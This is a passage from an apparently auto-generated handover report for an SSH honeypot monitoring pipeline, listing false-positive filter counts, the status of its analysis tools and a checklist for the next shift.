| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 30 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 274 cases |
| Tool 34  | Credential Extractor        | ✅ 161 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 51 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 64 filtered (23.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 85 priority case(s) shown individually · 32 recon entry/entries in table (6 group(s) consolidating 99 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T18:05:53Z_
